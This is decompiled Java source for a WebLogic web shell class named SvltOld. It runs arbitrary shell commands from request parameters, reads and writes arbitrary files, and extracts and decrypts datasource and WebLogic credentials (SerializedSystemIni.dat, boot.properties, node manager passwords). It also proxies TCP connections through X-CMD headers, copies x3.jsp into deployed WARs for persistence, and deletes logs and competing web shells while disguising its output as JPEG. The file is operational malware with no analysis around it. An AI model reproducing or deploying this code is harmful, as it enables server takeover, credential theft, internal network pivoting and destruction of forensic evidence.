package util;

import weblogic.security.internal.SerializedSystemIni;
import weblogic.security.internal.encryption.ClearOrEncryptedService;
import weblogic.security.internal.encryption.EncryptionService;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.Deflater;

/* loaded from: jar1.jar:myjar/SvltOld.class */
public class SvltOld {
    PageContext pc;
    HttpServletRequest rqst;
    HttpServletResponse rsps;
    OutputStream out;
    HttpSession ss;
    private String key = "%TJHG<>?Z-)98&^5";
    private String szCroot = "";
    private ClearOrEncryptedService ces = null;
    private EncryptionService es = null;
    private List<String> rdol = new ArrayList();
    private String szPn = "X3_verify_mIjyqEnm7D1D_tyJ0FN3rw.jsp";
    Map mP = new HashMap();
    boolean bPr = false;
    boolean bHvP = false;

    private void p(String str) {
        try {
            if (this.out == null || str == null) {
                return;
            }
            this.out.write(str.getBytes());
        } catch (Exception e) {
        }
    }

    public void log(Exception exc) {
        if (this.out == null || exc == null) {
            return;
        }
        exc.printStackTrace(new PrintStream(this.out));
    }

    public byte[] rdfs1(String str) {
        File file = new File(str);
        byte[] bArr = null;
        int length = (int) file.length();
        FileInputStream fileInputStream = null;
        if (file.exists() && length > 0) {
            try {
                byte[] bArr2 = new byte[length];
                fileInputStream = new FileInputStream(file);
                fileInputStream.read(bArr2, 0, length);
                bArr = bArr2;
                if (fileInputStream != null) {
                    try {
                        fileInputStream.close();
                    } catch (Exception e) {
                    }
                }
            } catch (Exception e2) {
                if (fileInputStream != null) {
                    try {
                        fileInputStream.close();
                    } catch (Exception e3) {
                    }
                }
            } catch (Throwable th) {
                if (fileInputStream != null) {
                    try {
                        fileInputStream.close();
                    } catch (Exception e4) {
                    }
                }
                throw th;
            }
        }
        return bArr;
    }

    public String rdfs(String str) {
        byte[] rdfs1 = rdfs1(str);
        String str2 = "";
        if (rdfs1 != null) {
            try {
                str2 = new String(rdfs1, "utf-8");
            } catch (Exception e) {
            }
        }
        return str2;
    }

    private String getJndiF(String str) {
        File[] listFiles = new File(str).listFiles();
        for (int i = 0; i < listFiles.length; i++) {
            String absolutePath = listFiles[i].getAbsolutePath();
            if (listFiles[i].isDirectory()) {
                getJndiF(absolutePath);
            } else {
                String rdfs = rdfs(absolutePath);
                if (listFiles[i].getAbsolutePath().endsWith(".xml")) {
                    if (-1 < rdfs.indexOf("\"dataSource\"")) {
                    }
                } else if (listFiles[i].getAbsolutePath().endsWith(".properties")) {
                    rdfs.replaceAll("#[^\\n]+", "");
                }
            }
        }
        return "";
    }

    public String getJdbcs() {
        String str = "";
        File file = new File("config" + File.separator + "jdbc");
        if (file.exists()) {
            File[] listFiles = file.listFiles();
            ArrayList arrayList = new ArrayList();
            for (File file2 : listFiles) {
                String absolutePath = file2.getAbsolutePath();
                if (file2.isFile() && absolutePath.endsWith(".xml")) {
                    getPp(rdfs(absolutePath), "<(url|driver-name|value|password-encrypted|jndi-name)[^>]*>([^<]+)", arrayList);
                }
            }
            str = list2s(arrayList);
            if (3 > arrayList.size()) {
            }
        }
        if (-1 == str.indexOf("jndi-name") && -1 == str.indexOf("driver-name")) {
            str = String.valueOf(str) + "\n" + getJndiF("./");
        }
        return str;
    }

    public String getSerializedSystemIni() {
        String str = null;
        String str2 = null;
        byte[] rdfs1;
        String str3 = "all SerializedSystemIni.dat:";
        File[] listFiles = new File(String.valueOf(System.getProperty("user.dir", "..")) + "/..").listFiles();
        for (int i = 0; i < listFiles.length; i++) {
            if (listFiles[i].isDirectory()) {
                String str4 = String.valueOf(listFiles[i].getAbsolutePath()) + File.separatorChar + "security" + File.separatorChar + "SerializedSystemIni.dat";
                if (new File(str4).exists() && (rdfs1 = rdfs1(str4)) != null) {
                    str3 = String.valueOf(str3) + DatatypeConverter.printBase64Binary(rdfs1) + ";";
                }
                if (new File(String.valueOf(listFiles[i].getAbsolutePath()) + File.separatorChar + "security" + File.separatorChar + "boot.properties").exists()) {
                    str3 = String.valueOf(str3) + rdfs(str) + ";";
                }
                if (new File(String.valueOf(listFiles[i].getAbsolutePath()) + File.separatorChar + "security" + File.separatorChar + "nodemanager" + File.separatorChar + "nm_password.properties").exists()) {
                    str3 = String.valueOf(str3) + rdfs(str2) + ";";
                }
            }
        }
        return str3;
    }

    public void croot(File file) {
        if (file.exists() || file.canRead()) {
            if (file.isFile() && (file.getAbsolutePath().endsWith("application.xml") || file.getAbsolutePath().endsWith("weblogic.xml"))) {
                Matcher matcher = Pattern.compile("<context-root>([^<]+)", 40).matcher(rdfs(file.getAbsolutePath()));
                while (matcher.find()) {
                    if (-1 == this.szCroot.indexOf(matcher.group(1))) {
                        p(String.valueOf(matcher.group(1)) + '\n');
                        this.szCroot = String.valueOf(this.szCroot) + ";" + matcher.group(1);
                    }
                }
            } else if (file.isDirectory()) {
                File[] listFiles = file.listFiles();
                for (int i = 0; i < listFiles.length; i++) {
                    if (listFiles[i].isFile() || listFiles[i].isAbsolute()) {
                        croot(listFiles[i]);
                    }
                }
            }
        }
    }

    public String getWars1(boolean z) {
        String rdfs = rdfs("config" + File.separator + "config.xml");
        String str = "<(console-context-path|connection-filter-rule|credential-encrypted|node-manager-username|node-manager-password-encrypted|source-path|target|credential-encrypted)[^>]*>([^<]+)";
        if (z) {
            str = "<source-path[^>]*>([^<]+)";
        }
        if (rdfs.length() > 0) {
            rdfs = list2s(getPp(rdfs, str, null));
        } else if (!z) {
            rdfs = "config.xml not ok";
        }
        return rdfs;
    }

    public String getWars() {
        return getWars1(false);
    }

    public void doMtx() {
        p(String.valueOf(getWars()) + "\n" + getJdbcs() + "\n" + getSerializedSystemIni());
    }

    private String c1(String str) {
        try {
            if (this.ces == null) {
                this.es = SerializedSystemIni.getEncryptionService();
            }
            if (this.es == null) {
                return str;
            }
            if (this.ces == null) {
                this.ces = new ClearOrEncryptedService(this.es);
            }
            return new String(this.ces.decryptBytes(str.getBytes()));
        } catch (Throwable th) {
            return str;
        }
    }

    public String list2s(List<String[]> list) {
        String c1;
        StringBuffer stringBuffer = new StringBuffer("");
        String str = "";
        for (int i = 0; i < list.size(); i++) {
            String[] strArr = list.get(i);
            if (1 < strArr.length) {
                if ((-1 < strArr[1].indexOf("{AES}") || -1 < strArr[1].indexOf("{3DES}")) && (c1 = c1(strArr[1])) != null && c1.length() > 0) {
                    strArr[1] = c1;
                }
                if ("url".contentEquals(strArr[0])) {
                    strArr[0] = "{\"jdbc_url\"";
                    strArr[1] = "\"" + strArr[1] + "\"";
                } else if ("driver-name".contentEquals(strArr[0])) {
                    strArr[0] = ",\"jdbc_drv\"";
                    strArr[1] = "\"" + strArr[1] + "\"";
                } else if ("value".contentEquals(strArr[0])) {
                    strArr[0] = ",\"jdbc_u\"";
                    strArr[1] = "\"" + strArr[1] + "\"";
                } else if ("password-encrypted".contentEquals(strArr[0])) {
                    strArr[0] = ",\"jdbc_p\"";
                    strArr[1] = "\"" + strArr[1] + "\"";
                } else if ("jndi-name".contentEquals(strArr[0])) {
                    strArr[0] = ",\"j\"";
                    strArr[1] = "\"" + strArr[1] + "\"}";
                }
                String str2 = String.valueOf(strArr[0]) + ":" + strArr[1];
                if (-1 >= str.indexOf(str2)) {
                    str = String.valueOf(str) + ";" + str2;
                    stringBuffer.append(str2).append("\n");
                }
            }
        }
        return stringBuffer.toString();
    }

    public List<String[]> getPp(String str, String str2, List<String[]> list) {
        if (list == null) {
            list = new ArrayList();
        }
        if (str != null && str2 != null) {
            Matcher matcher = Pattern.compile(str2, 40).matcher(str.replace("\r", "").replace("\n", "").replaceAll(">[\\s\\r\\n]*<", "><"));
            while (matcher.find()) {
                if (2 <= matcher.groupCount()) {
                    list.add(new String[]{matcher.group(1).trim(), matcher.group(2).trim()});
                }
            }
        }
        return list;
    }

    public void delFiles(String str) {
        if (str != null) {
            String[] split = str.split("[;,\n]");
            for (int i = 0; i < split.length; i++) {
                try {
                    split[i] = split[i].trim();
                    if (split[i].length() != 0) {
                        FileWriter fileWriter = new FileWriter(split[i]);
                        fileWriter.write("");
                        fileWriter.flush();
                        fileWriter.close();
                        new File(split[i].trim()).delete();
                    }
                } catch (Exception e) {
                }
            }
        }
    }

    public void lstFiles(String str) {
        File[] listFiles;
        if (str != null) {
            for (String str2 : str.split("[;,\n]")) {
                try {
                    File file = new File(str2.trim());
                    if (file.isFile()) {
                        p(String.valueOf(file.getAbsolutePath()) + "\n");
                    } else {
                        for (File file2 : file.listFiles()) {
                            if (file2.isFile()) {
                                p(String.valueOf(file2.getAbsolutePath()) + "\n");
                            } else if (file2.isDirectory()) {
                                lstFiles(file2.getAbsolutePath());
                            }
                        }
                    }
                } catch (Exception e) {
                }
            }
        }
    }

    public String yxor(byte[] bArr) {
        byte[] bArr2 = new byte[bArr.length];
        byte[] bytes = this.key.getBytes();
        int length = bytes.length;
        int i = 0;
        for (int i2 = 0; i2 < bArr.length; i2++) {
            if (i >= length) {
                i = 0;
            }
            int i3 = i;
            i++;
            bArr2[i2] = (byte) (bytes[i3] ^ bArr[i2]);
        }
        return new String(bArr2);
    }

    private void lcNoshell() {
        int size = this.rdol.size();
        for (int i = 0; i < size; i++) {
            File file = new File(this.rdol.get(i));
            file.setReadOnly();
            file.setWritable(false);
        }
    }

    private void cp(String str, String str2) {
        try {
            if (!str2.endsWith(File.separator)) {
                str2 = String.valueOf(str2) + File.separator;
            }
            String str3 = String.valueOf(str2) + "x3.jsp";
            if (new File(str3).exists()) {
                return;
            }
            FileInputStream fileInputStream = new FileInputStream(str);
            FileOutputStream fileOutputStream = new FileOutputStream(str3);
            byte[] bArr = new byte[8096];
            while (true) {
                int read = fileInputStream.read(bArr, 0, 8096);
                if (-1 >= read) {
                    fileOutputStream.close();
                    fileInputStream.close();
                    return;
                } else if (read > 0) {
                    fileOutputStream.write(bArr, 0, read);
                }
            }
        } catch (Exception e) {
        }
    }

    public void lstWar(String str, String str2) {
        File[] listFiles;
        if (str != null) {
            try {
                File file = new File(str);
                if (file.isDirectory() && (str.endsWith("war") || str.endsWith("war/"))) {
                    cp(str2, str);
                }
                for (File file2 : file.listFiles()) {
                    if (file2.isDirectory()) {
                        lstWar(file2.getAbsolutePath(), str2);
                    }
                }
            } catch (Exception e) {
            }
        }
    }

    private void cpx3() {
        try {
            String url = this.pc.getServletContext().getResource("/x3.jsp").toString();
            if (!new File(url).exists()) {
                return;
            }
            String[] split = getWars1(true).split("\n");
            for (int i = 0; i < split.length; i++) {
                if (-1 >= split[i].indexOf("source-path:")) {
                    split[i] = split[i].trim().replaceAll(".*?:", "");
                    if (split[i].length() > 0 && !split[i].endsWith(".war")) {
                        lstWar(split[i], url);
                    }
                }
            }
            lstWar("../", url);
        } catch (Exception e) {
        }
    }

    private void dlAllShell(String str) {
        File[] listFiles;
        for (File file : new File(str).listFiles()) {
            if (file.isDirectory()) {
                String absolutePath = file.getAbsolutePath();
                if (absolutePath.endsWith("bea_wls9_async_response") || absolutePath.endsWith("bea_wls_internal") || absolutePath.endsWith("uddi") || absolutePath.endsWith("bea_wls_deployment_internal") || absolutePath.endsWith("uddiexplorer") || absolutePath.endsWith("wls-wsat") || absolutePath.endsWith("bea_wls_diagnostics")) {
                    this.rdol.add(absolutePath);
                    try {
                        new File(absolutePath).setWritable(true);
                    } catch (Exception e) {
                    }
                }
                dlAllShell(file.getAbsolutePath());
            } else {
                String absolutePath2 = file.getAbsolutePath();
                if (-1 == absolutePath2.indexOf("x3") && -1 == absolutePath2.indexOf("X3_verify")) {
                    if (absolutePath2.endsWith(".logs")) {
                        p(String.valueOf(absolutePath2) + "\n");
                        delFiles(absolutePath2);
                    } else if (absolutePath2.endsWith(".jsp") || absolutePath2.endsWith(".ico") || absolutePath2.endsWith(".txt") || absolutePath2.endsWith(".png") || absolutePath2.endsWith(".jpg") || absolutePath2.endsWith(".png")) {
                        if (-1 < absolutePath2.indexOf("bea_wls9_async_response") || -1 < absolutePath2.indexOf("bea_wls_internal")) {
                            p(String.valueOf(absolutePath2) + "\n");
                            delFiles(absolutePath2);
                        } else {
                            String rdfs = rdfs(absolutePath2);
                            if ((-1 < rdfs.indexOf(".getRuntime(") && -1 < rdfs.indexOf(".exec(")) || ((-1 < rdfs.indexOf("X-TARGET") && -1 < rdfs.indexOf("X-PORT")) || -1 < rdfs.indexOf("Anonymous-ghost") || -1 < rdfs.indexOf("java.io.FileOutputStream(application.getRealPath") || ((-1 < rdfs.indexOf("c.getMetaData().getCatalogs") && -1 < rdfs.indexOf("\"jdbc:oracle\"")) || -1 < rdfs.indexOf("CNVD-") || -1 < rdfs.indexOf("Vulnerable") || (-1 < rdfs.indexOf("getServletContext().getResource") && -1 < rdfs.indexOf("request.getParameter(\"f\"))).write("))))) {
                                p(String.valueOf(absolutePath2) + "\n" + rdfs + "\n");
                                delFiles(absolutePath2);
                            }
                        }
                    } else if (absolutePath2.endsWith(".class")) {
                        if (-1 < absolutePath2.toLowerCase().indexOf("bea_wls_internal") || -1 < absolutePath2.indexOf("wls-wsat") || -1 < absolutePath2.indexOf("bea_wls9_async_response")) {
                            p(String.valueOf(absolutePath2) + "\n");
                            delFiles(absolutePath2);
                        } else {
                            String rdfs2 = rdfs(absolutePath2);
                            if ((-1 < rdfs2.indexOf(".getRuntime(") && -1 < rdfs2.indexOf(".exec(")) || ((-1 < rdfs2.indexOf("X-TARGET") && -1 < rdfs2.indexOf("X-PORT")) || -1 < rdfs2.indexOf("Anonymous-ghost") || -1 < rdfs2.indexOf("CNVD-") || -1 < rdfs2.indexOf("weblogic/servlet/internal/WebAppServletContext") || -1 < rdfs2.indexOf("weblogic/work/ExecuteThread"))) {
                                p(String.valueOf(absolutePath2) + "\n");
                                delFiles(absolutePath2);
                            }
                        }
                    }
                }
            }
        }
    }

    private String getPm(String str) {
        String queryString;
        if (!this.bPr && (queryString = this.rqst.getQueryString()) != null) {
            for (String str2 : queryString.split("&")) {
                String str3 = null;
                String[] split = str2.split("=");
                if (1 < split.length) {
                    str3 = split[1];
                }
                this.mP.put(split[0], str3);
            }
        }
        if (this.mP.size() > 0) {
            this.bHvP = true;
            return (String) this.mP.get(str);
        }
        return this.rqst.getParameter(str);
    }

    private void createMyId() {
        if (this.pc.getServletContext() != null) {
            try {
                String url = this.pc.getServletContext().getResource("/").toString();
                if (!url.startsWith("file:")) {
                    return;
                }
                FileOutputStream fileOutputStream = new FileOutputStream(new File(String.valueOf(url.substring("file:".length())) + "mIjyqEnm7D1D_tyJ0FN3rw.txt"));
                fileOutputStream.write(("i am mIjyqEnm7D1D+tyJ0FN3rw==  " + new Date().toGMTString() + " ").getBytes());
                fileOutputStream.close();
            } catch (Exception e) {
            }
        }
    }

    public void c() throws Exception {
        String[] strArr;
        int i;
        String property;
        String property2;
        String pm = getPm("ls");
        String str = "/bin/sh";
        String str2 = "-c";
        String str3 = String.valueOf(this.rqst.getHeader("user-agent")) + "\n";
        String str4 = null;
        String str5 = null;
        String str6 = "";
        String pm2 = getPm("fsDel");
        String pm3 = getPm("lstFiles");
        if (pm != null) {
            pm = new String(DatatypeConverter.parseBase64Binary(pm), "utf-8");
            if ("mtx".equals(pm)) {
                doMtx();
                return;
            } else if (pm.startsWith("croot,")) {
                this.szCroot = "";
                for (String str7 : pm.split(",")[1].split(";")) {
                    croot(new File(str7));
                }
                return;
            } else if ("dlAllShell".equals(pm)) {
                dlAllShell("..");
                lcNoshell();
                return;
            } else if ("whoami".equals(pm) && (property2 = System.getProperty("user.name")) != null) {
                p(property2);
                return;
            } else if ("cpx3".equals(pm)) {
                cpx3();
                return;
            } else if ("info".equals(pm)) {
                p(System.getProperties().toString().replaceAll("\\s*[,;]\\s*", "\n"));
                return;
            } else if (-1 < pm.indexOf("list")) {
                String[] split = pm.split("[;,]");
                for (int i2 = 1; i2 < split.length; i2++) {
                    lstFiles(split[i2]);
                }
                return;
            }
        }
        if (pm2 != null) {
            delFiles(pm2);
        } else if (pm3 != null) {
            lstFiles(pm3);
        } else {
            if (String.valueOf(File.separatorChar).equals("\\")) {
                str = "cmd";
                str2 = "/C";
            }
            String pm4 = getPm("f");
            if (pm4 != null) {
                try {
                    String decode = URLDecoder.decode(pm4, "utf-8");
                    String pm5 = getPm("fv");
                    String str8 = pm5;
                    if (pm5 == null) {
                        FileInputStream fileInputStream = new FileInputStream(decode);
                        byte[] bArr = new byte[4096];
                        ServletOutputStream outputStream = this.rsps.getOutputStream();
                        while (true) {
                            int read = fileInputStream.read(bArr, 0, 4096);
                            if (-1 >= read) {
                                break;
                            }
                            outputStream.write(bArr, 0, read);
                        }
                        outputStream.flush();
                        outputStream.close();
                        if (fileInputStream == null) {
                            return;
                        }
                        fileInputStream.close();
                        return;
                    }
                    try {
                        str8 = URLDecoder.decode(str8, "utf-8");
                    } catch (Exception e) {
                    }
                    String[] split2 = decode.split("[;,]");
                    String[] strArr2 = {split2[0]};
                    if (2 == split2.length && (property = System.getProperty(split2[0])) != null) {
                        strArr2 = property.split(File.pathSeparator);
                    }
                    for (int i3 = 0; i3 < strArr2.length; i3++) {
                        if (2 <= split2.length) {
                            strArr2[i3] = String.valueOf(strArr[i]) + File.pathSeparator + split2[1];
                        }
                        try {
                            FileOutputStream fileOutputStream = new FileOutputStream(strArr2[i3]);
                            fileOutputStream.write(str8.getBytes("utf-8"));
                            fileOutputStream.flush();
                            fileOutputStream.close();
                        } catch (Exception e2) {
                        }
                    }
                    return;
                } catch (Exception e3) {
                    log(e3);
                }
            }
            String str9 = "X-CMD";
            String str10 = "X-STATUS";
            String str11 = "CONNECT";
            if (this.rqst.getHeader(str9) == null) {
                Map<String, String> map = System.getenv();
                for (String str12 : map.keySet()) {
                    if (str12 != null && -1 == str6.indexOf(str12)) {
                        str6 = String.valueOf(str6) + str12 + ",";
                        str3 = String.valueOf(str3) + str12 + "=\"" + map.get(str12) + "\"\n";
                        if ("WL_HOME".equalsIgnoreCase(str12)) {
                            str4 = map.get(str12);
                        } else if ("os.name".equalsIgnoreCase(str12)) {
                            str5 = map.get(str12);
                        }
                    }
                }
                Properties properties = System.getProperties();
                for (Object obj : properties.keySet()) {
                    if (obj != null && -1 == str6.indexOf((String) obj)) {
                        str6 = String.valueOf(str6) + ((String) obj) + ",";
                        str3 = String.valueOf(str3) + ((String) obj) + "=\"" + properties.getProperty((String) obj) + "\"\n";
                        if ("WL_HOME".equalsIgnoreCase((String) obj)) {
                            str4 = properties.getProperty((String) obj);
                        } else if ("os.name".equalsIgnoreCase((String) obj)) {
                            str5 = properties.getProperty((String) obj);
                        }
                    }
                }
                if (str4 != null && str5 != null) {
                    boolean z = -1 < str5.indexOf("Linux");
                    String str13 = String.valueOf(str4) + "/common/bin/wlst." + (z ? "sh" : "cmd");
                    if (!z) {
                        str13 = str13.replace("/", "\\");
                    }
                    if (new File(str13).exists()) {
                        str3 = String.valueOf(str3) + "wlst=\"" + str13 + "\"\n";
                    }
                }
                try {
                    if (this.pc.getServletContext() != null) {
                        str3 = String.valueOf(str3) + "curRealPath=\"" + this.pc.getServletContext().getResource("/").toString() + "\"";
                    }
                } catch (Exception e4) {
                    log(e4);
                }
            }
            if (pm != null) {
                byte[] bArr2 = new byte[2048];
                try {
                    Class<?> cls = Class.forName("java.lang.Runtime");
                    Process process = (Process) cls.getMethod("exec", String[].class).invoke(cls.getMethod("getRuntime", null).invoke(null, null), new String[]{str, str2, pm});
                    OutputStream outputStream2 = process.getOutputStream();
                    InputStream inputStream = process.getInputStream();
                    for (int read2 = inputStream.read(bArr2, 0, bArr2.length); -1 < read2; read2 = inputStream.read(bArr2, 0, bArr2.length)) {
                        if (read2 > 0) {
                            p(new String(bArr2, 0, read2));
                        }
                    }
                    outputStream2.close();
                    inputStream.close();
                    str3 = "";
                } catch (Exception e5) {
                    log(e5);
                }
            }
            String header = this.rqst.getHeader(str9);
            if (header == null) {
                try {
                    String str14 = "";
                    new HashSet();
                    Enumeration<NetworkInterface> enumeration = null;
                    try {
                        enumeration = NetworkInterface.getNetworkInterfaces();
                    } catch (SocketException e6) {
                    }
                    while (enumeration != null && enumeration.hasMoreElements()) {
                        Enumeration<InetAddress> inetAddresses = enumeration.nextElement().getInetAddresses();
                        while (inetAddresses.hasMoreElements()) {
                            InetAddress nextElement = inetAddresses.nextElement();
                            if (!nextElement.isLoopbackAddress() && !nextElement.isLinkLocalAddress() && !nextElement.isMulticastAddress()) {
                                String hostAddress = nextElement.getHostAddress();
                                if (16 > hostAddress.length()) {
                                    str14 = String.valueOf(str14) + "," + hostAddress;
                                }
                            }
                        }
                    }
                    p("<!-- ip:" + str14 + "," + str3);
                    if (str3.length() > 0) {
                        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
                        p(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf("\ngetBootClassPath=" + runtimeMXBean.getBootClassPath()) + "\ngetClassPath=" + runtimeMXBean.getClassPath()) + "\ngetLibraryPath=" + runtimeMXBean.getLibraryPath()) + "\ngetSystemProperties=" + runtimeMXBean.getSystemProperties()) + "\ngetInputArguments=" + runtimeMXBean.getInputArguments().toString()) + "\npid=" + runtimeMXBean.getName().split("@")[0]);
                    }
                    p(" -->");
                } catch (Exception e7) {
                    log(e7);
                }
                p("<!-- _xx_xx_ -->");
                return;
            }
            this.rsps.setHeader(str10, "OK");
            if (header.compareTo(str11) == 0) {
                try {
                    String header2 = this.rqst.getHeader("X-TARGET");
                    int parseInt = Integer.parseInt(this.rqst.getHeader("X-PORT"));
                    SocketChannel open = SocketChannel.open();
                    open.connect(new InetSocketAddress(header2, parseInt));
                    open.configureBlocking(false);
                    this.ss.setAttribute("socket", open);
                    this.rsps.setHeader(str10, "OK");
                } catch (UnknownHostException e8) {
                    this.rsps.setHeader("X-ERROR", e8.getMessage());
                    this.rsps.setHeader(str10, "FAIL");
                } catch (IOException e9) {
                    this.rsps.setHeader("X-ERROR", e9.getMessage());
                    this.rsps.setHeader(str10, "FAIL");
                }
            } else if (header.compareTo("DISCONNECT") == 0) {
                try {
                    ((SocketChannel) this.ss.getAttribute("socket")).socket().close();
                } catch (Exception e10) {
                }
                this.ss.invalidate();
            } else if (header.compareTo("READ") == 0) {
                SocketChannel socketChannel = (SocketChannel) this.ss.getAttribute("socket");
                try {
                    ByteBuffer allocate = ByteBuffer.allocate(512);
                    ServletOutputStream outputStream3 = this.rsps.getOutputStream();
                    for (int read3 = socketChannel.read(allocate); read3 > 0; read3 = socketChannel.read(allocate)) {
                        outputStream3.write(allocate.array(), 0, read3);
                        outputStream3.flush();
                        allocate.clear();
                    }
                    this.rsps.setHeader(str10, "OK");
                    outputStream3.flush();
                    outputStream3.close();
                } catch (Exception e11) {
                    this.rsps.setHeader("X-ERROR", e11.getMessage());
                    this.rsps.setHeader(str10, "FAIL");
                }
            } else if (header.compareTo("FORWARD") == 0) {
                SocketChannel socketChannel2 = (SocketChannel) this.ss.getAttribute("socket");
                try {
                    int contentLength = this.rqst.getContentLength();
                    byte[] bArr3 = new byte[contentLength];
                    this.rqst.getInputStream().read(bArr3, 0, contentLength);
                    ByteBuffer allocate2 = ByteBuffer.allocate(contentLength);
                    allocate2.clear();
                    allocate2.put(bArr3);
                    allocate2.flip();
                    while (allocate2.hasRemaining()) {
                        socketChannel2.write(allocate2);
                    }
                    this.rsps.setHeader(str10, "OK");
                } catch (Exception e12) {
                    this.rsps.setHeader("X-ERROR", e12.getMessage());
                    this.rsps.setHeader(str10, "FAIL");
                    socketChannel2.socket().close();
                }
            }
        }
    }

    public boolean equals(Object obj) {
        Deflater deflater = null;
        if (obj instanceof PageContext) {
            try {
                try {
                    this.pc = (PageContext) obj;
                    this.rqst = this.pc.getRequest();
                    this.rsps = this.pc.getResponse();
                    this.out = this.rsps.getOutputStream();
                    this.ss = this.rqst.getSession(false);
                    if (this.ss == null) {
                        this.ss = this.rqst.getSession(true);
                    }
                    if (this.ss != null && getPm("c") != null) {
                        this.ss.setAttribute("c", getPm("c"));
                    }
                    this.rsps.reset();
                    this.rsps.setContentType("image/jpeg");
                    c();
                    if (this.out != null) {
                        try {
                            this.out.flush();
                        } catch (Throwable th) {
                        }
                        try {
                            this.out.close();
                        } catch (Throwable th2) {
                        }
                    }
                    if (0 != 0) {
                        deflater.end();
                    }
                    createMyId();
                    return false;
                } catch (Exception e) {
                    p(e.getMessage());
                    if (this.out != null) {
                        try {
                            this.out.flush();
                        } catch (Throwable th3) {
                        }
                        try {
                            this.out.close();
                        } catch (Throwable th4) {
                        }
                    }
                    if (0 != 0) {
                        deflater.end();
                    }
                    createMyId();
                    return false;
                }
            } catch (Throwable th5) {
                if (this.out != null) {
                    try {
                        this.out.flush();
                    } catch (Throwable th6) {
                    }
                    try {
                        this.out.close();
                    } catch (Throwable th7) {
                    }
                }
                if (0 != 0) {
                    deflater.end();
                }
                createMyId();
                throw th5;
            }
        }
        return false;
    }
}
